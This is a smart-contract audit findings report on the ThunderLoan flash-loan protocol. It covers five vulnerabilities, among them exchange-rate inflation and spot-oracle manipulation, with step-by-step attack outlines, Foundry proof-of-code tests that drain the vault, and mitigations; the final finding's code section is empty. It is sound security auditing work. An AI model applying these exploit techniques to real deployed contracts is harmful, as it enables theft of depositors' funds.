# 6 thunder loan audit - Findings Report
## Commit hash: 2250d81b89aebdd9cb135382e068af8c269e3a4b

## Protocol Overview 

**ThunderLoan Protocol**

ThunderLoan is an up-gradable flash-loan marketplace inspired by Aave.
Liquidity providers deposit whitelisted ERC-20 tokens into per-asset “AssetToken” vaults. When you deposit, the contract mints interest-bearing AssetTokens that track an ever-increasing exchange-rate; your balance always represents your share of the underlying pool.

Borrowers can, in a single transaction, borrow any available token with no collateral, receive it in their own contract, perform arbitrary logic, and must repay *amount + flat fee* before the tx ends. ThunderLoan immediately transfers the fee to the relevant AssetToken and bumps the exchange-rate, streaming yield to every depositor.

Core contracts
• **ThunderLoan (UUPS-upgradeable)** – orchestrates deposits, redemptions, flash-loans, manages token whitelist, and sets the global fee.
• **AssetToken** – ERC-20 wrapper that holds the underlying funds and enforces mint/burn/actions from ThunderLoan only.
• **OracleUpgradeable** – reads TSwap pools to price tokens in WETH for fair fee calculation.
• **ERC1967Proxy** – enables future upgrades to ThunderLoan logic via owner-authorized implementation changes.

Security notes: funds live in AssetToken contracts, not the logic contract; owner can list tokens, adjust fee, and upgrade implementation, so governance keys must be trusted.##Findings by Pattern


 **Derived From** : Fee unit mismatch and deposit-driven rate bump break accounting invariants

[H-1]. AssetToken.exchangeRate inflated with WETH-priced fee during deposit lets attacker drain pool by burning few shares
[M-2]. Flashloan repayment check compares WETH-priced fee against underlying units, mischarges borrowers and can brick redemptions



 **Derived From** : Spot AMM oracle used directly for fee without TWAP/staleness checks

[H-3]. Spot oracle manipulation via deposit inflates exchangeRate and enables full vault drain via redeem
[M-4]. Manipulating TSwap spot price reduces flashloan fee to near-zero enabling cheap, repeatable flashloans



 **Derived From** : Fee calculation suffers rounding bias; splitting loans reduces total fees

[M-5]. ERC20 decimals mismatch in getCalculatedFee massively misprices fees for non‑18 dec tokens (e.g., USDC 6 dec), undercharging borrowers


### Number of Findings
- C: 0
- H: 2
- M: 3
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Fee unit mismatch and deposit-driven rate bump break accounting invariants

## [H-1]. AssetToken.exchangeRate inflated with WETH-priced fee during deposit lets attacker drain pool by burning few shares

## Derived From Pattern/Invariant
Fee unit mismatch and deposit-driven rate bump break accounting invariants

## Exploit Type
AccountingInvariantViolation

## Location
ThunderLoan.deposit

## Minimim Privilege Required
Permissionless

## Description
ThunderLoan.deposit computes `calculatedFee = getCalculatedFee(token, amount)` in WETH units (1e18) using OracleUpgradeable price, then immediately calls `assetToken.updateExchangeRate(calculatedFee)` before transferring any fee to the AssetToken. In AssetToken.updateExchangeRate, the new rate is computed as `s_exchangeRate * (totalSupply() + fee) / totalSupply()`, which (a) treats `fee` as if it were denominated in AssetToken shares and (b) increases the rate without any matching increase in underlying. If the oracle price is elevated (manipulable AMM) or the token has fewer decimals, the computed `fee` can be large relative to the current `totalSupply()`, causing a sharp jump in the exchange-rate while the underlying stays the same. The attacker can then burn a very small portion of their just-minted shares to withdraw all underlying (pool drain), leaving everyone else with unredeemable AssetTokens. Vulnerable snippets: ThunderLoan.deposit: `assetToken.mint(...); uint256 calculatedFee = getCalculatedFee(token, amount); assetToken.updateExchangeRate(calculatedFee); token.safeTransferFrom(msg.sender, address(assetToken), amount);` AssetToken.updateExchangeRate: `newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();`

## Impact
Attacker inflates exchange-rate without adding underlying, then redeems a tiny portion of their shares to withdraw the entire pool (permanent theft) and bricks redemptions for everyone else.

## Proof of Concept
1) Victim deposits U units of an allowed token to seed the pool.
2) Attacker manipulates the AMM price (OracleUpgradeable source) upward for the same token (typical for AMM spot or direct mock in tests), or targets a token where fee/totalSupply becomes large.
3) Attacker calls deposit with a small amount A. ThunderLoan mints S shares at the old rate, then calls updateExchangeRate with a large `fee` denominated in WETH units, inflating s_exchangeRate massively while the underlying has not increased.
4) Attacker immediately calls redeem, burning only x << S shares, computed as x = (currentUnderlyingBalance * 1e18) / newExchangeRate, to withdraw the entire underlying (U+A). Net profit: steals U (victim funds). Subsequent redemptions revert because computed amounts exceed available underlying.

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IPoolFactory} from "src/interfaces/IPoolFactory.sol";
import {ITSwapPool} from "src/interfaces/ITSwapPool.sol";

// Minimal ERC20 with minting for tests
contract MockERC20 is IERC20, IERC20Metadata {
    string public name; string public symbol; uint8 public override decimals;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    constructor(string memory n, string memory s, uint8 d){ name=n; symbol=s; decimals=d; }
    function transfer(address to, uint256 amt) external override returns (bool){
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt; balanceOf[to] += amt; emit Transfer(msg.sender, to, amt); return true;
    }
    function approve(address sp, uint256 amt) external override returns (bool){ allowance[msg.sender][sp] = amt; emit Approval(msg.sender, sp, amt); return true; }
    function transferFrom(address f, address t, uint256 a) external override returns (bool){
        uint256 al = allowance[f][msg.sender]; require(al >= a && balanceOf[f] >= a, "allow/bal");
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a; balanceOf[t] += a; emit Transfer(f,t,a); return true;
    }
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; totalSupply += amt; emit Transfer(address(0), to, amt); }
    function name() external view override returns (string memory) { return name; }
    function symbol() external view override returns (string memory) { return symbol; }
}

contract MockTSwapPool is ITSwapPool {
    uint256 public price;
    constructor(uint256 p){ price = p; }
    function setPrice(uint256 p) external { price = p; }
    function getPriceInWeth(address) external view override returns (uint256) { return price; }
}

contract MockPoolFactory is IPoolFactory {
    address public pool;
    constructor(address p){ pool = p; }
    function getPool(address) external view override returns (address) { return pool; }
}

contract ThunderLoan_ExchangeRateInflation_DepositFee_Test is Test {
    ThunderLoan loan;
    MockERC20 usdc;
    AssetToken aUSDC;
    MockTSwapPool pool;
    MockPoolFactory factory;

    address owner = address(0xABCD);
    address victim = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        vm.startPrank(owner);
        loan = new ThunderLoan();
        // Set up oracle once with a mutable pool price
        pool = new MockTSwapPool(1e18); // initial fair price
        factory = new MockPoolFactory(address(pool));
        loan.initialize(address(factory));
        vm.stopPrank();

        usdc = new MockERC20("USDC", "USDC", 6);

        // whitelist token and get AssetToken
        vm.prank(owner);
        aUSDC = loan.setAllowedToken(usdc, true);

        // fund accounts
        usdc.mint(victim, 1_000_000e6);
        usdc.mint(attacker, 1_000e6);
    }

    function test_DrainPool_ByInflatingER_WithDepositFee_UnitMismatch() public {
        // Victim seeds pool
        vm.startPrank(victim);
        usdc.approve(address(loan), type(uint256).max);
        loan.deposit(usdc, 1_000_000e6);
        vm.stopPrank();

        // Manipulate oracle price very high to magnify the bogus "fee" passed as shares
        vm.prank(owner); // owner not required for pool price; use no prank or attacker; keeping neutral
        pool.setPrice(1e27);

        // Attacker deposits a small amount; deposit() mints at old ER, then inflates ER massively via updateExchangeRate(fee)
        vm.startPrank(attacker);
        usdc.approve(address(loan), type(uint256).max);
        loan.deposit(usdc, 1e6); // 1 USDC
        vm.stopPrank();

        uint256 newER = aUSDC.getExchangeRate();
        uint256 underlyingBal = usdc.balanceOf(address(aUSDC)); // ~1,000,001 USDC
        uint256 sharesNeeded = (underlyingBal * 1e18) / newER;  // tiny due to huge ER
        uint256 attackerShares = aUSDC.balanceOf(attacker);
        assertGt(attackerShares, sharesNeeded, "attacker must have enough shares to drain");

        // Drain all underlying
        vm.prank(attacker);
        loan.redeem(usdc, sharesNeeded);

        assertEq(usdc.balanceOf(address(aUSDC)), 0, "vault drained");
        assertGt(usdc.balanceOf(attacker), 1_000e6, "attacker profits");

        // Victim now cannot redeem due to empty vault
        vm.startPrank(victim);
        vm.expectRevert();
        loan.redeem(usdc, 1e6);
        vm.stopPrank();
    }
}


## Suggested Mitigation
- Remove the exchange-rate bump from deposit entirely. Deposits should only mint shares at the current exchange rate and transfer the exact underlying; no fee-derived rate change belongs in the deposit flow.
- Fix units and calculation source of truth:
  - Compute and apply rewards based on the actual change in underlying reserves, not on a synthetic WETH-priced fee. A robust pattern is to set s_exchangeRate = (currentUnderlyingBalance * EXCHANGE_RATE_PRECISION) / totalSupply, where currentUnderlyingBalance = underlying.balanceOf(address(this)).
  - In the flash-loan path, update the exchange rate only after verifying repayment and after the fee is actually resident in the AssetToken. Example flow: record startingBalance; execute loan; verify endingBalance >= startingBalance + feeInUnderlying; then recompute exchangeRate from reserves as above.
  - If you must precompute fee, convert it into underlying units using a non-manipulable price (e.g., TWAP) and correct decimals, and only apply after funds are received.
- Consider removing AssetToken.updateExchangeRate(uint256) altogether and replacing it with a function that recalculates from actual reserves (no external input), eliminating unit/price oracle risks.


## [M-2]. Flashloan repayment check compares WETH-priced fee against underlying units, mischarges borrowers and can brick redemptions

## Derived From Pattern/Invariant
Fee unit mismatch and deposit-driven rate bump break accounting invariants

## Exploit Type
AccountingInvariantViolation

## Location
ThunderLoan.flashloan

## Minimim Privilege Required
Permissionless

## Description
ThunderLoan.flashloan computes `fee = getCalculatedFee(token, amount)` using OracleUpgradeable's WETH price and 18-dec precision, then uses that value in two places: (1) calls `assetToken.updateExchangeRate(fee)` (same broken formula as deposit) before any fee is received, and (2) enforces `endingBalance >= startingBalance + fee`. Both places treat the WETH-priced `fee` as if it were denominated in underlying units. For tokens where decimals != 18 (e.g., USDC 6-dec), this causes severe mischarging (fee is orders of magnitude too small), while still inflating the exchange-rate without matched underlying. Result: borrowers underpay, LPs get under-rewarded, and repeated flashloans can ratchet the exchange-rate upward without any real funds, eventually making redemptions revert.

## Impact
For tokens with decimals != 18, the protocol misinterprets a WETH-denominated fee as if it were in underlying units. This undercharges borrowers by orders of magnitude (e.g., ~0.015 USDC instead of ~30 USDC on a 10k USDC loan at 0.3%), causing significant, permissionless revenue loss for LPs. Additionally, deposit() calls updateExchangeRate(calculatedFee) before any fee is actually added to the vault, inflating the exchange rate without matching underlying and introducing accounting drift that can accumulate across deposits. While flashloan itself ultimately transfers the (miscomputed) fee back and does not inherently create unbacked rate growth, the deposit path’s premature rate bump can misallocate value and may require admin/state repair if compounded.

## Proof of Concept
Root cause 1 (fee unit mismatch):
- getCalculatedFee(token, amount) computes feeWETH = amount * priceInWETH / 1e18, then fee = feeWETH * feeRate / 1e18, but this fee (in WETH wei) is enforced as if it were denominated in the underlying token’s smallest units. For a 6-dec token like USDC, with priceInWETH ≈ 0.0005e18 and feeRate = 0.3% (3e15), on a 10,000 USDC loan (amount = 10,000e6):
  - valueInWETH = 10,000e6 * 5e14 / 1e18 = 5e6 wei WETH
  - chargedFee = 5e6 * 3e15 / 1e18 = 15,000 underlying units = 0.015 USDC
  - Correct fee in underlying should be amount * feeRate / 1e18 = 10,000e6 * 3e15 / 1e18 = 30e6 = 30 USDC. Borrowers thus pay ~2000x less than intended.

Root cause 2 (unbacked rate bump on deposit):
- deposit() calls assetToken.updateExchangeRate(calculatedFee) before transferring the depositor’s amount and without ever transferring any ‘fee’ to the vault. This increases s_exchangeRate using (totalSupply + fee)/totalSupply with “fee” that never arrives, inflating the rate without added underlying and creating accounting drift across deposits.

Attack outline:
1) Owner whitelists a 6-dec token (USDC). Victim seeds the pool.
2) Attacker flashloans large amounts repeatedly and repays amount + the tiny miscomputed fee, extracting cheap liquidity at LPs’ expense.
3) Meanwhile, each deposit by any user triggers an unbacked exchange rate increase, shifting value away from new entrants and risking mis-accounting that needs admin repair.

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

interface IFlashLoanReceiver { function executeOperation(address token, uint256 amt, uint256 fee, address initiator, bytes calldata params) external; }

// Minimal 6-dec token
contract MockERC20_USDC is IERC20, IERC20Metadata {
    string public name = "USDC"; string public symbol = "USDC"; uint8 public override decimals = 6; uint256 public totalSupply;
    mapping(address=>uint256) public override balanceOf; mapping(address=>mapping(address=>uint256)) public override allowance;
    function mint(address to,uint256 amt) external { balanceOf[to]+=amt; totalSupply+=amt; emit Transfer(address(0),to,amt);}    
    function transfer(address to,uint256 amt) external override returns(bool){ require(balanceOf[msg.sender]>=amt, "bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; emit Transfer(msg.sender,to,amt); return true; }
    function approve(address s,uint256 a) external override returns(bool){ allowance[msg.sender][s]=a; emit Approval(msg.sender,s,a); return true; }
    function transferFrom(address f,address t,uint256 a) external override returns(bool){ uint256 al=allowance[f][msg.sender]; require(al>=a && balanceOf[f]>=a, "allow/bal"); if(al!=type(uint256).max){ allowance[f][msg.sender]=al-a; } balanceOf[f]-=a; balanceOf[t]+=a; emit Transfer(f,t,a); return true; }
}

// Harness to control oracle output; requires OracleUpgradeable.getPriceInWeth to be virtual in implementation
contract ThunderLoanHarness is ThunderLoan {
    uint256 private _mockPrice;
    function setMockPrice(uint256 p) external { _mockPrice = p; }
    function getPriceInWeth(address) public view override returns (uint256) { return _mockPrice; }
}

contract Receiver is IFlashLoanReceiver {
    IERC20 token; address loan;
    constructor(IERC20 _t, address _loan){ token=_t; loan=_loan; }
    function executeOperation(address, uint256 amt, uint256 fee, address, bytes calldata) external override {
        token.approve(loan, type(uint256).max);
        ThunderLoan(loan).repay(IERC20(address(token)), amt + fee); // repay exactly what ThunderLoan expects
    }
}

contract ThunderLoan_Flashloan_FeeUnitMismatch_Test is Test {
    ThunderLoanHarness loan; MockERC20_USDC usdc; AssetToken aUSDC; Receiver recv;
    address owner = address(0xABCD); address victim = address(0xBEEF); address attacker = address(0xA11CE);

    function setUp() public {
        vm.startPrank(owner);
        loan = new ThunderLoanHarness();
        // initialize with any address; oracle is overridden in harness
        loan.initialize(address(0xdead));
        loan.setMockPrice(5e14); // 0.0005 WETH per USDC
        vm.stopPrank();

        usdc = new MockERC20_USDC();
        vm.prank(owner); aUSDC = loan.setAllowedToken(usdc, true);

        // Seed funds
        usdc.mint(victim, 100_000e6);
        usdc.mint(attacker, 20_000e6);

        vm.startPrank(victim);
        usdc.approve(address(loan), type(uint256).max);
        loan.deposit(usdc, 100_000e6);
        vm.stopPrank();

        recv = new Receiver(usdc, address(loan));
        vm.prank(attacker); usdc.approve(address(loan), type(uint256).max);
    }

    function test_Flashloan_Undercharges_6decimals() public {
        uint256 amount = 10_000e6; // 10k USDC
        // Protocol’s miscomputed fee (WETH-priced but used as underlying)
        uint256 misFee = loan.getCalculatedFee(usdc, amount);
        // Correct fee if charged in underlying units should be amount * feeRate / 1e18 = 30 USDC
        uint256 feeRate = loan.getFee(); // default 3e15
        uint256 correctUnderlyingFee = amount * feeRate / 1e18; // 30e6

        assertEq(misFee, 15_000);              // 0.015 USDC
        assertEq(correctUnderlyingFee, 30e6);  // 30.000000 USDC
        assertLt(misFee, correctUnderlyingFee);

        uint256 vaultBefore = usdc.balanceOf(address(aUSDC));
        vm.prank(attacker);
        loan.flashloan(address(recv), usdc, amount, "");
        uint256 vaultAfter = usdc.balanceOf(address(aUSDC));

        // Only the tiny misFee was collected
        assertEq(vaultAfter - vaultBefore, misFee);
    }
}


## Suggested Mitigation
Fix fee units and the exchange-rate update ordering/formula:
- Compute fee in the same units as the token being borrowed. If you want to charge X% of the underlying, there is no need for the oracle: feeUnderlying = amount * s_flashLoanFee / 1e18. If you insist on using a WETH reference, convert back to underlying: feeWETH = amount * priceInWETH / 1e18; feeUnderlying = feeWETH * 1e18 / priceInWETH, and normalize token decimals correctly. In practice, this simplifies to the same percentage-of-amount when charging in the underlying token.
- In flashloan, only call assetToken.updateExchangeRate after the fee has actually been transferred in and the ending balance verified. Use a balance-based formula: newRate = oldRate * (underlyingBalance + fee) / underlyingBalance. Do not mix aToken totalSupply with underlying units.
- In deposit, do not call updateExchangeRate based on deposit amount at all; deposits should not change the exchange rate. If deposits must pay a fee, transfer that fee to the AssetToken first, then update using the balance-based formula above.
- Consider deriving the exchange rate on-demand from underlyingBalance and totalSupply instead of storing and mutating s_exchangeRate to avoid drift from ordering mistakes.





 **Derived From** : Spot AMM oracle used directly for fee without TWAP/staleness checks

## [H-3]. Spot oracle manipulation via deposit inflates exchangeRate and enables full vault drain via redeem

## Derived From Pattern/Invariant
Spot AMM oracle used directly for fee without TWAP/staleness checks

## Exploit Type
Oracle

## Location
ThunderLoan.getCalculatedFee

## Minimim Privilege Required
Permissionless

## Description
ThunderLoan.getCalculatedFee() reads a manipulable spot price from TSwap via OracleUpgradeable.getPriceInWeth(). Deposit() then calls assetToken.updateExchangeRate(calculatedFee) using that price-derived fee. Because updateExchangeRate computes newExchangeRate = oldRate * (totalSupply + fee) / totalSupply without any underlying being added for that “fee”, an attacker can push the TSwap spot price extremely high just before deposit, making calculatedFee arbitrarily large. They mint AssetTokens first at the old exchange rate, then the fee inflates the exchange rate massively, after which the attacker can redeem a small portion of their freshly minted AssetTokens to withdraw the entire underlying held by the AssetToken (victims’ liquidity), draining the vault. Vulnerable snippet: function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) { uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision; fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision; }

## Impact
An attacker can manipulate the spot oracle just before calling deposit to make the calculated fee arbitrarily large. Because deposit() mints AssetTokens at the old exchange rate and then immediately calls updateExchangeRate(calculatedFee) without any corresponding underlying being added, the exchange rate is inflated without backing. The attacker can then redeem a small portion of their newly minted AssetTokens to withdraw most or all of the vault’s underlying in a single transaction, resulting in a full pool drain and loss of depositors’ funds.

## Proof of Concept
High-level steps:
1) Victim deposits a large amount of the underlying token to seed the pool. Exchange rate starts at 1e18, and totalSupply equals the amount deposited (scaled by 1e18).
2) Attacker manipulates the TSwap spot price for the token to an extremely high value (no TWAP/heartbeat/staleness checks in the oracle).
3) Attacker deposits a small amount at the old exchange rate, minting AssetTokens cheaply.
4) During the same deposit, ThunderLoan computes a huge fee from the manipulated spot price and passes it to assetToken.updateExchangeRate(). The formula newRate = oldRate * (totalSupply + fee) / totalSupply massively increases the exchange rate, even though the vault received no additional underlying for that fee.
5) Attacker immediately redeems only a small portion of their AssetTokens at the now-inflated exchange rate, withdrawing nearly all of the vault’s underlying and leaving it drained.

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("TKN", "TKN") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

// Generic pool mock: return a configurable price for any selector
contract MockPool {
    uint256 public price;
    constructor(uint256 p){ price = p; }
    function setPrice(uint256 p) external { price = p; }
    fallback(bytes calldata) external returns (bytes memory) {
        return abi.encode(price);
    }
}

// Generic factory mock: return the pool address for any selector
contract MockFactory {
    address public pool;
    constructor(address p){ pool = p; }
    fallback(bytes calldata) external returns (bytes memory) {
        return abi.encode(pool);
    }
}

contract OracleSpotManipulationDrainTest is Test {
    ThunderLoan loan;
    MockERC20 token;
    AssetToken asset;
    MockPool pool;
    MockFactory factory;

    address owner = address(0xA11CE);
    address victim = address(0xBEEF);
    address attacker = address(0xCAFE);

    function setUp() public {
        loan = new ThunderLoan();
        token = new MockERC20();
        pool = new MockPool(1e18); // initial normal price
        factory = new MockFactory(address(pool));

        vm.prank(owner);
        loan.initialize(address(factory));

        vm.prank(owner);
        asset = loan.setAllowedToken(IERC20(address(token)), true);
    }

    function test_drain_via_spot_oracle_on_deposit() public {
        // Victim seeds liquidity
        uint256 victimDeposit = 1_000e18;
        token.mint(victim, victimDeposit);
        vm.startPrank(victim);
        token.approve(address(loan), type(uint256).max);
        loan.deposit(IERC20(address(token)), victimDeposit);
        vm.stopPrank();

        // Manipulate the oracle spot price extremely high
        pool.setPrice(1e30);

        // Attacker deposits a tiny amount, mints at old rate, then updateExchangeRate inflates the rate
        token.mint(attacker, 1e18);
        vm.startPrank(attacker);
        token.approve(address(loan), type(uint256).max);
        loan.deposit(IERC20(address(token)), 1e18);
        vm.stopPrank();

        // Compute how many AssetTokens are needed to withdraw the entire vault
        uint256 vaultBal = token.balanceOf(address(asset));
        uint256 rate = asset.getExchangeRate();
        uint256 toRedeem = (vaultBal * 1e18) / rate; // tokens needed to pull all underlying

        // Ensure attacker has enough AssetTokens
        uint256 attackerBal = asset.balanceOf(attacker);
        assertGt(attackerBal, toRedeem);

        // Drain the vault
        vm.prank(attacker);
        loan.redeem(IERC20(address(token)), toRedeem);

        // Assert vault drained and attacker profit
        assertEq(token.balanceOf(address(asset)), 0);
        assertGt(token.balanceOf(attacker), 1e18);
    }
}


## Suggested Mitigation
Remove oracle-derived fee application from deposit entirely. Exchange rate should not change during a deposit except via the normal mint logic at the current rate. In flashloans, compute fee in the borrowed token units (e.g., feeTokens = amount * s_flashLoanFee / 1e18), not via a spot WETH conversion, and update the exchange rate only after the vault actually receives the fee. A robust approach is to make AssetToken.updateExchangeRate derive the new rate from the observed underlying balance delta, not from an external parameter: e.g., read underlying balance before flashloan (U0) and after payback (U1), then set newRate = oldRate * U1 / U0. If you must use price data, add TWAP/heartbeat/staleness checks, cap per-tx fee impact, and reject out-of-band prices via an external anchor. Additionally, change updateExchangeRate to use underlying-denominated fee (or balance delta) rather than adding an arbitrary value to totalSupply.


## [M-4]. Manipulating TSwap spot price reduces flashloan fee to near-zero enabling cheap, repeatable flashloans

## Derived From Pattern/Invariant
Spot AMM oracle used directly for fee without TWAP/staleness checks

## Exploit Type
Oracle

## Location
ThunderLoan.getCalculatedFee

## Minimim Privilege Required
Permissionless

## Description
ThunderLoan.flashloan() computes the fee via getCalculatedFee(), which reads a single spot price from TSwap without TWAP or staleness guards. An attacker can first push the pool price for the borrowed token sharply downward in the same transaction, then call flashloan to borrow a large amount and repay with a negligible fee, repeatedly. This permanently distorts protocol revenue and depositor yield. Vulnerable snippet: function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) { uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision; fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision; }

## Impact
An attacker can temporarily manipulate the TSwap spot price for the borrowed token immediately before calling flashloan. Because getCalculatedFee uses the current spot price (no TWAP/staleness guard) and the fee is enforced in underlying token units, the attacker can make the fee arbitrarily small (above the minimal rounding threshold imposed by updateExchangeRate) and obtain cheap capital repeatedly. This directly reduces protocol revenue and depositor yield and can be repeated until governance intervenes. Note: if the manipulated fee is too small, updateExchangeRate will revert due to rounding; the attacker simply sets a small-but-sufficient price so the fee is > ~totalSupply/exchangeRate (still dust-level), thus the attack remains practical.

## Proof of Concept
High-level steps (single transaction):
- Step 1: Manipulate the TSwap pool to push the token’s price in WETH sharply down (e.g., via a flash swap or dumping tokens). Keep the price just high enough to avoid updateExchangeRate rounding to zero but still dust-level.
- Step 2: Call ThunderLoan.flashloan. getCalculatedFee() reads the manipulated spot price and computes a tiny fee (in underlying token units).
- Step 3: Repay amount + tiny fee; the vault’s balance increases only by dust while the attacker enjoyed cheap capital. Repeat while maintaining the skewed price.
This yields substantial, repeatable underpayment of fees and depressed depositor yield.

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IFlashLoanReceiver} from "src/interfaces/IFlashLoanReceiver.sol";
import {IPoolFactory} from "src/interfaces/IPoolFactory.sol";
import {ITSwapPool} from "src/interfaces/ITSwapPool.sol";

contract MockERC20 is ERC20("TKN","TKN") {
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MockPool is ITSwapPool {
    uint256 public price;
    constructor(uint256 p){ price = p; }
    function setPrice(uint256 p) external { price = p; }
    // Assumed interface function
    function getPriceInWeth() external view returns (uint256) { return price; }
}

contract MockFactory is IPoolFactory {
    address public pool;
    constructor(address p){ pool = p; }
    // Assumed interface function
    function getPool(address /*token*/) external view returns (address) { return pool; }
}

contract Borrower is IFlashLoanReceiver {
    ThunderLoan public loan;
    constructor(ThunderLoan _loan){ loan = _loan; }
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool) {
        IERC20(token).approve(address(loan), type(uint256).max);
        loan.repay(IERC20(token), amount + fee);
        return true;
    }
}

contract CheapFlashloanSpotOracleTest is Test {
    ThunderLoan loan;
    MockERC20 token;
    AssetToken asset;
    MockPool pool;
    MockFactory factory;

    address owner = address(0xA11CE);
    address user = address(0xBEEF);

    function setUp() public {
        loan = new ThunderLoan();
        token = new MockERC20();
        pool = new MockPool(1e18); // fair price initially: 1.0 WETH per token (scaled 1e18)
        factory = new MockFactory(address(pool));

        vm.prank(owner);
        loan.initialize(address(factory));
        vm.prank(owner);
        asset = loan.setAllowedToken(IERC20(address(token)), true);

        // Seed vault liquidity
        token.mint(user, 1_000e18);
        vm.startPrank(user);
        token.approve(address(loan), type(uint256).max);
        loan.deposit(IERC20(address(token)), 1_000e18);
        vm.stopPrank();
    }

    function test_spot_price_manipulation_underprices_flashloan_fee() public {
        uint256 amount = 500e18;

        // Baseline fee at fair price
        uint256 normalFee = loan.getCalculatedFee(IERC20(address(token)), amount);
        assertGt(normalFee, 0);

        // Manipulate spot price way down but keep it non-zero to avoid rounding revert in updateExchangeRate
        // With amount=500e18 and fee=0.3%, fee ≈ 1.5 * price (in token wei). price=1500 ⇒ fee≈2250 wei
        pool.setPrice(1500);
        uint256 cheapFee = loan.getCalculatedFee(IERC20(address(token)), amount);
        assertGt(cheapFee, 0);
        // Ensure drastic underpricing vs fair fee at 1e18
        assertLt(cheapFee, normalFee / 1e12);

        // Prefund borrower with just the tiny fee so it can repay amount+fee
        Borrower b = new Borrower(loan);
        token.mint(address(b), cheapFee);

        uint256 startVaultBal = token.balanceOf(address(asset));
        loan.flashloan(address(b), IERC20(address(token)), amount, bytes(""));
        uint256 endVaultBal = token.balanceOf(address(asset));

        // Vault only gained the tiny, manipulated fee
        assertEq(endVaultBal, startVaultBal + cheapFee);
    }
}


## Suggested Mitigation
Best options (pick one or combine):
- Remove oracle dependency from fee calculation and charge a straightforward percentage of the borrowed token amount: feeInToken = amount * s_flashLoanFee / 1e18. This is standard for flashloans and eliminates price manipulation risk entirely.
- If you insist on WETH-denominated fees, use a robust oracle: compute fee in WETH via a TWAP (sufficient window/observations) with staleness/heartbeat checks and then convert that WETH fee back to token units using the same guarded oracle before enforcing repayment. Add per-asset minFee floors (in token units) and max deviation checks vs prior price to prevent dust-level fees.
- Additionally, enforce a minimum absolute fee per asset (e.g., minFee[token]) to avoid integer-rounding bypass and dust-fee loans even under adverse conditions.





 **Derived From** : Fee calculation suffers rounding bias; splitting loans reduces total fees

## [M-5]. ERC20 decimals mismatch in getCalculatedFee massively misprices fees for non‑18 dec tokens (e.g., USDC 6 dec), undercharging borrowers

## Derived From Pattern/Invariant
Fee calculation suffers rounding bias; splitting loans reduces total fees

## Exploit Type
ERC20DecimalsMismatch

## Location
ThunderLoan.getCalculatedFee

## Minimim Privilege Required
Permissionless

## Description
getCalculatedFee assumes the borrowed amount uses 18 decimals by dividing by s_feePrecision (1e18) when converting amount*price to WETH. For tokens with decimals != 18 (e.g., USDC 6), the correct denominator should be 10^decimals, not 1e18. Vulnerable snippet: valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision; The result is off by 10^(decimals-18), leading to severe undercharging (or overcharging) and distorted exchange-rate updates, especially for 6-decimal tokens.

## Impact
Because getCalculatedFee multiplies the raw token amount by a WETH-priced quote and divides by 1e18, tokens with decimals != 18 (e.g., USDC 6) produce fees that are orders of magnitude too small relative to the intended 0.3% fee. Borrowers can flashloan these tokens and reliably underpay, slashing protocol revenue and LP yield. The same mispricing also inflates exchange-rate updates inconsistently during deposit(). Funds aren’t stolen or bricked, but fee income is materially and persistently reduced until upgraded.

## Proof of Concept
Setup: Owner whitelists USDC (6 decimals). Assume oracle returns price = 5e14 (i.e., 1 USDC ≈ 0.0005 WETH, scaled 1e18). Fee rate = 3e15 (0.3%).
Exploit steps:
1) Attacker contract calls flashloan(receiver=Attacker, token=USDC, amount=1,000,000e6) where 1,000,000e6 is 1,000,000 USDC in base units.
2) ThunderLoan calculates fee using current code: valueOfBorrowedToken = amount * price / 1e18 = 1e12 * 5e14 / 1e18 = 5e8 (wei of WETH), then fee = 5e8 * 3e15 / 1e18 = 1,500,000 (base units). That is 1.5 USDC.
3) Protocol requires endingBalance ≥ startingBalance + 1.5 USDC, so attacker repays 1,000,000 USDC + 1.5 USDC and completes successfully.
4) Intended fee for 0.3% on 1,000,000 USDC is 3,000 USDC. The attacker underpays by ~2000x, repeating this to extract essentially fee-free liquidity and dramatically reduce LP yield.
Note: deposit() also calls getCalculatedFee and updateExchangeRate, so the same mispricing distorts the exchange-rate bump on deposits.

## Proof of Code
